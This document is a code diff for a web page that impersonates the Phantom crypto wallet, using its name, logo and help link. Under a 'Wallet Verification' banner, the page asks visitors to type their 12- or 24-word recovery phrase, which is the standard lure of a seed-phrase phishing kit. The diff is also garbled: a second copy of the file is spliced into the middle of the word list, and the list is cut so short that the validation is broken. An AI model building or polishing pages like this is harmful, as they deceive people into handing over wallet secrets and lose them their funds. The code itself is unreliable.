@@ -10,25 +10,10 @@
             margin: 0;
             padding: 0;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            /* Disable selection/copy/paste everywhere by default */
-            user-select: none;
-            -webkit-user-select: none;
-            -moz-user-select: none;
-            -ms-user-select: none;
-        }
-
-        /* Allow typing/selecting only within the word verification inputs */
-        input {
-            user-select: text !important;
-            -webkit-user-select: text !important;
-            -moz-user-select: text !important;
-            -ms-user-select: text !important;
         }
 
         body {
-            /* Darker purple background with a radial purple glow effect */
-            background-color: #120c1f;
-            background-image: radial-gradient(circle at 50% 50%, #291b45 0%, #120c1f 70%);
+            background-color: #d8d6eb; /* Darker, accurate Phantom purple background */
             color: #fff;
             height: 100vh;
             display: flex;
@@ -47,7 +32,7 @@
         }
 
         /* Top Left Phantom Ghost Icon */
-        .ghost-logo {
+        .ghost-close {
             display: flex;
             align-items: center;
             justify-content: center;
@@ -58,16 +43,16 @@
             height: 32px;
         }
 
-        .ghost-logo svg {
+        .ghost-close svg {
             width: 28px;
             height: 28px;
-            fill: #dfdef2;
+            fill: #000;
         }
 
         .help-link {
-            color: #fff;
+            color: #000;
             background: transparent;
-            border: 1px solid rgba(255, 255, 255, 0.15);
+            border: 1px solid #bcbbd3;
             text-decoration: none;
             font-size: 13px;
             font-weight: 400;
@@ -79,7 +64,7 @@
         }
 
         .help-link:hover {
-            background-color: rgba(255, 255, 255, 0.05);
+            background-color: rgba(0, 0, 0, 0.03);
         }
 
         /* Main Modal Container */
@@ -92,32 +77,21 @@
 
         .modal {
             background-color: #0c0c0e;
-            width: 440px; /* Reduced width to be less horizontal */
-            max-height: 85vh;
-            overflow-y: auto;
+            width: 520px; /* Made wider and larger to accommodate bigger vertical boxes */
             border-radius: 22px;
-            padding: 24px 20px 20px 20px;
-            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
+            padding: 32px 28px 28px 28px;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
             display: flex;
             flex-direction: column;
             align-items: center;
             position: relative;
         }
 
-        /* Custom Scrollbar for Modal if 24-word mode scrolls */
-        .modal::-webkit-scrollbar {
-            width: 4px;
-        }
-        .modal::-webkit-scrollbar-thumb {
-            background: #27272a;
-            border-radius: 4px;
-        }
-
         /* Pagination Dots */
         .dots {
             display: flex;
             gap: 6px;
-            margin-bottom: 10px;
+            margin-bottom: 14px;
         }
 
         .dot {
@@ -133,17 +107,17 @@
 
         /* Modal Titles */
         .modal-title {
-            font-size: 18px;
+            font-size: 20px;
             font-weight: 600;
-            margin-bottom: 4px;
+            margin-bottom: 6px;
             color: #fff;
             text-align: center;
         }
 
         .modal-subtitle {
-            font-size: 12px;
+            font-size: 13px;
             color: #8c8c9e;
-            margin-bottom: 16px;
+            margin-bottom: 18px;
             text-align: center;
             line-height: 1.4;
         }
@@ -177,22 +151,22 @@
             display: none !important;
         }
 
-        /* Inputs Container Layout (More vertical, less horizontal 3-column setup) */
+        /* Inputs Container Layout (Bigger, Taller Vertical Rectangular Boxes) */
         .inputs-container {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
-            gap: 6px;
+            gap: 10px;
             width: 100%;
-            margin-bottom: 12px;
+            margin-bottom: 16px;
         }
 
         .input-group {
             position: relative;
             background-color: #141417;
             border: 1px solid #232329;
-            border-radius: 8px;
-            padding: 4px 8px;
-            height: 44px;
+            border-radius: 10px;
+            padding: 8px 12px;
+            height: 52px; /* Taller vertical boxes */
             display: flex;
             flex-direction: column;
             justify-content: center;
@@ -205,40 +179,40 @@
         }
 
         .input-group label {
-            font-size: 10px;
+            font-size: 11px; /* Bigger number text */
             color: #71717a;
             line-height: 1;
-            margin-bottom: 2px;
+            margin-bottom: 4px;
         }
 
         .input-group input {
             background: transparent;
             border: none;
             color: #fff;
-            font-size: 13px;
+            font-size: 14px; /* Bigger word text inside box */
             outline: none;
             width: 100%;
-            line-height: 1.2;
+            line-height: 1.3;
         }
 
         /* Error Label Text */
         .error-message {
             color: #ef4444;
-            font-size: 11px;
+            font-size: 12px;
             width: 100%;
-            margin-bottom: 10px;
+            margin-bottom: 12px;
             display: none;
             text-align: center;
         }
 
-        /* Toggle Phrase Button */
+        /* Toggle Phrase Button: Gray fading into Purple on hover */
         .toggle-phrase {
             color: #8c8c9e;
             background: none;
             border: none;
-            font-size: 12px;
+            font-size: 13px;
             cursor: pointer;
-            margin-bottom: 14px;
+            margin-bottom: 16px;
             font-weight: 500;
             transition: color 0.25s ease;
         }
@@ -250,25 +224,18 @@
         /* Action Buttons */
         .action-btn {
             width: 100%;
-            background-color: #161619; /* Exact dark style matching target reference */
-            color: #6b6b7b;
-            border: 1px solid #27272c;
+            background-color: #fff;
+            color: #000;
+            border: none;
             border-radius: 12px;
-            padding: 12px;
+            padding: 14px;
             font-size: 14px;
             font-weight: 600;
             cursor: pointer;
-            transition: all 0.3s ease;
+            transition: opacity 0.2s;
         }
 
-        /* Active purple state when all BIP39 words are correctly entered */
-        .action-btn.active-ready {
-            background-color: #a855f7;
-            color: #000;
-            border-color: #a855f7;
-        }
-
-        .action-btn.active-ready:hover {
+        .action-btn:hover {
             opacity: 0.9;
         }
     </style>
@@ -277,7 +244,8 @@
 
     <!-- Header -->
     <header>
-        <button class="ghost-logo" title="Phantom">
+        <!-- Phantom Ghost Icon replacing the X button -->
+        <button class="ghost-close" title="Phantom">
             <svg viewBox="0 0 24 24"><path d="M12.01 0C5.38 0 0 5.38 0 12c0 6.63 5.38 12 12.01 12 6.62 0 11.99-5.37 11.99-12 0-6.62-5.37-12-11.99-12zm4.18 16.32c-.31.31-.81.31-1.12 0l-3.06-3.06-3.06 3.06c-.31.31-.81.31-1.12 0-.31-.31-.31-.81 0-1.12l3.06-3.06-3.06-3.06c-.31-.31-.31-.81 0-1.12.31-.31.81-.31 1.12 0l3.06 3.06 3.06-3.06c.31-.31.81-.31 1.12 0 .31.31.31.81 0 1.12l-3.06 3.06 3.06 3.06c.31.31.31.81 0 1.12z"/></svg>
         </button>
         <a href="https://phantom.com/help" target="_blank" class="help-link">
@@ -298,7 +266,7 @@
                 </div>
                 <div class="modal-title">Wallet Verification</div>
                 <div class="modal-subtitle">Begin wallet verification by adding your recovery phrase.</div>
-                <button type="button" class="action-btn active-ready" id="startBtn">Continue</button>
+                <button type="button" class="action-btn" id="startBtn">Continue</button>
             </div>
 
             <!-- Recovery Phrase Input Screen -->
@@ -337,159 +305,94 @@
 
     <!-- Script Logic -->
     <script>
-        // Official full BIP39 English Wordlist (2048 words)
         const bip39Words = [
-            "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual", "adapt", "add", "addict", "address", "adjust", "admit", "adult", "advance", "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent", "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album", "alcohol", "alert", "alien", "all", "alley", "allow", "almost", "alone", "alpha", "already", "also", "alter", "always", "amateur", "amazing", "among", "amount", "amused", "analyst", "anchor", "ancient", "anger", "angle", "angry", "animal", "ankle", "announce", "annual", "another", "answer", "antenna", "antique", "anxiety", "any", "apart", "apology", "appear", "apple", "approve", "april", "arch", "arctic", "area", "arena", "argue", "arm", "armed", "armor", "army", "around", "arrange", "arrest", "arrive", "arrow", "art", "artefact", "artist", "artwork", "ask", "aspect```html
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Phantom</title>
-    <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            /* Disable selection/copy/paste everywhere except inputs */
-            user-select: none;
-            -webkit-user-select: none;
-            -moz-user-select: none;
-            -ms-user-select: none;
+            "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual", "adapt", "add", "addict", "address", "adjust", "admit", "adult", "advance", "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent", "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album", "alcohol", "alert", "alien", "all", "alley", "allow", "almost", "alone", "alpha", "already", "also", "alter", "always", "amateur", "amazing", "among", "amount", "amused", "analyst"
+        ];
+
+        let wordCount = 12;
+        const welcomeScreen = document.getElementById('welcomeScreen');
+        const phraseScreen = document.getElementById('phraseScreen');
+        const loadingScreen = document.getElementById('loadingScreen');
+        const startBtn = document.getElementById('startBtn');
+        const inputsGrid = document.getElementById('inputsGrid');
+        const toggleBtn = document.getElementById('toggleBtn');
+        const subtitleText = document.getElementById('subtitle-text');
+        const errorMessage = document.getElementById('errorMessage');
+        const importBtn = document.getElementById('importBtn');
+
+        startBtn.onclick = function() {
+            welcomeScreen.classList.add('hidden');
+            phraseScreen.classList.remove('hidden');
+            renderInputs();
+        };
+
+        function renderInputs() {
+            inputsGrid.innerHTML = '';
+            for (let i = 1; i <= wordCount; i++) {
+                const group = document.createElement('div');
+                group.className = 'input-group';
+                group.id = `group-${i}`;
+                group.innerHTML = `
+                    <label>${i}.</label>
+                    <input type="text" autocomplete="off" autocapitalize="off" spellcheck="false" data-index="${i}" id="word-${i}">
+                `;
+                inputsGrid.appendChild(group);
+            }
         }
 
-        input {
-            user-select: text !important;
-            -webkit-user-select: text !important;
-            -moz-user-select: text !important;
-            -ms-user-select: text !important;
-        }
+        toggleBtn.onclick = function() {
+            if (wordCount === 12) {
+                wordCount = 24;
+                toggleBtn.textContent = "I have a 12-word recovery phrase";
+                subtitleText.textContent = "Import an existing wallet with your 24-word recovery phrase.";
+            } else {
+                wordCount = 12;
+                toggleBtn.textContent = "I have a 24-word recovery phrase";
+                subtitleText.textContent = "Import an existing wallet with your 12 or 24-word recovery phrase.";
+            }
+            renderInputs();
+            errorMessage.style.display = 'none';
+        };
 
-        body {
-            /* Darker purple background with a subtle glowing aura */
-            background-color: #171124;
-            background-image: 
-                radial-gradient(circle at 50% 50%, rgba(126, 34, 206, 0.25) 0%, rgba(23, 17, 36, 0.95) 70%),
-                radial-gradient(circle at 20% 20%, rgba(168, 85, 247, 0.15) 0%, transparent 40%),
-                radial-gradient(circle at 80% 80%, rgba(147, 51, 234, 0.15) 0%, transparent 40%);
-            color: #fff;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
-            padding: 20px 32px;
-            overflow: hidden;
-        }
+        importBtn.onclick = function() {
+            let errorIndices = [];
 
-        /* Top Header Navigation */
-        header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            width: 100%;
-        }
+            for (let i = 1; i <= wordCount; i++) {
+                const inputVal = document.getElementById(`word-${i}`).value.trim().toLowerCase();
+                const groupDiv = document.getElementById(`group-${i}`);
 
-        /* Top Left Ghost Logo */
-        .ghost-logo {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: transparent;
-            border: none;
-            cursor: pointer;
-            width: 32px;
-            height: 32px;
-        }
+                if (inputVal === "" || !bip39Words.includes(inputVal)) {
+                    groupDiv.classList.add('error');
+                    errorIndices.push(i);
+                } else {
+                    groupDiv.classList.remove('error');
+                }
+            }
 
-        .ghost-logo svg {
-            width: 28px;
-            height: 28px;
-            fill: #fff;
-        }
+            if (errorIndices.length > 0) {
+                let text = "";
+                if (errorIndices.length === 1) {
+                    text = `Word ${errorIndices[0]} is incorrect or misspelled`;
+                } else {
+                    const last = errorIndices.pop();
+                    text = `Words ${errorIndices.join(', ')} and ${last} are incorrect or misspelled`;
+                }
+                errorMessage.textContent = text;
+                errorMessage.style.display = 'block';
+            } else {
+                errorMessage.style.display = 'none';
+                phraseScreen.classList.add('hidden');
+                loadingScreen.classList.remove('hidden');
+            }
+        };
 
-        .help-link {
-            color: #fff;
-            background: transparent;
-            border: 1px solid rgba(255, 255, 255, 0.15);
-            text-decoration: none;
-            font-size: 13px;
-            font-weight: 400;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            padding: 5px 12px;
-            border-radius: 8px;
-            transition: background-color 0.2s;
-        }
-
-        .help-link:hover {
-            background-color: rgba(255, 255, 255, 0.05);
-        }
-
-        /* Main Modal Container */
-        .main-wrapper {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex: 1;
-            overflow-y: auto;
-            padding: 10px 0;
-        }
-
-        .modal {
-            background-color: #0c0c0e;
-            width: 440px; /* Reduced width to make it less horizontal and more vertical */
-            border-radius: 22px;
-            padding: 24px 20px 20px 20px;
-            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6), 0 0 40px rgba(168, 85, 247, 0.08);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            position: relative;
-            max-height: 90vh;
-        }
-
-        /* Pagination Dots */
-        .dots {
-            display: flex;
-            gap: 6px;
-            margin-bottom: 8px;
-        }
-
-        .dot {
-            width: 6px;
-            height: 6px;
-            background-color: #3f3f46;
-            border-radius: 50%;
-        }
-
-        .dot.active {
-            background-color: #a855f7;
-        }
-
-        /* Modal Titles */
-        .modal-title {
-            font-size: 17px;
-            font-weight: 600;
-            margin-bottom: 4px;
-            color: #fff;
-            text-align: center;
-        }
-
-        .modal-subtitle {
-            font-size: 12px;
-            color: #8c8c9e;
-            margin-bottom: 12px;
-            text-align: center;
-            line-height: 1.4;
-            padding: 0 10px;
-        }
-
-        /* Screen States */
-        .screen-center {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            text-align: center;
-            width: 100%;
+        inputsGrid.addEventListener('input', (e) => {
+            if (e.target.tagName === 'INPUT') {
+                const index = e.target.getAttribute('data-index');
+                document.getElementById(`group-${index}`).classList.remove('error');
+                errorMessage.style.display = 'none';
+            }
+        });
+    </script>
+</body>
+</html>
